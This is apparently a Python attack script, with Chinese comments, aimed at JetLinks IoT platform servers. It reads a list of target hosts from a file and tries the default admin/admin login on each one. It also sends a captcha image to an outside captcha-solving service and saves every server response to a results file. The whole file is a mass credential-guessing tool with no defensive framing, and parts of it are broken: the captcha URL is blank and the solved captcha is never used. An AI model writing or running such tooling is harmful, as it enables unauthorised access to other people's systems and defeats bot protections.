import requests
import sys
import base64
import json
import os 

session = requests.session()
path=sys.path[0]
print(path)

def b64_image(image):
    ##base64转image存储成图片
    strs = image
    imgdata = base64.b64decode(strs)
    file = open(path + '\\tmp\\cap.jpg', 'wb')
    file.write(imgdata)
    file.close()
 
def get_code():
    ##获取image、UUID值
    code_url = ""
    code_image = requests.get(code_url)
    json_data = json.loads(code_image.content)
    base64_image = json_data['data']['img']
    b64_image(base64_image)
 

def base64_api():
    #path = os.getcwd()
    img_path = path + "/tmp/cap.jpg"
    print(img_path)
    with open(img_path, 'rb') as f:
        base64_data = base64.b64encode(f.read())
        b64 = base64_data.decode()
    data = {"username": "", "password": "", "image": b64}##你的验证码api账户
    result = json.loads(requests.post("http://api.ttshitu.com/base64", json=data).text)
    if result['success']:
        print("验证码识别成功")
        return result["data"]["result"]
    else:
        print("验证码识别抽风了，再执行一遍吧")

def attack(captcha):
    for line in open(path+ "\\url.txt", encoding='utf-8'):
        host=str(line).replace('\n','')
        print(host)
        burp0_url = host + "/jetlinks/authorize/login"
        burp0_headers = {"Accept": "application/json", "X-Access-Token": "1634639633552", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36", "Content-Type": "application/json;charset=UTF-8", "Origin": "http://114.116.124.108:9000", "Referer": "http://114.116.124.108:9000/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        burp0_json={"expires": -1, "password": "admin", "tokenType": "default", "username": "admin", "verifyCode": "", "verifyKey": ""}
        try:
            response=session.post(burp0_url, headers=burp0_headers, json=burp0_json)
        except:
            pass
        #print(response.text)
        f=open(path+ '\\result.txt','a', encoding='utf-8')
        print(burp0_url+'\n')
        print(response.text)
        f.write(burp0_url+'\n')
        f.write(response.text)
        f.write('\n\n')
        f.close()


    
if __name__ == '__main__':
    get_code()
    captcha =base64_api()
    attack(captcha)
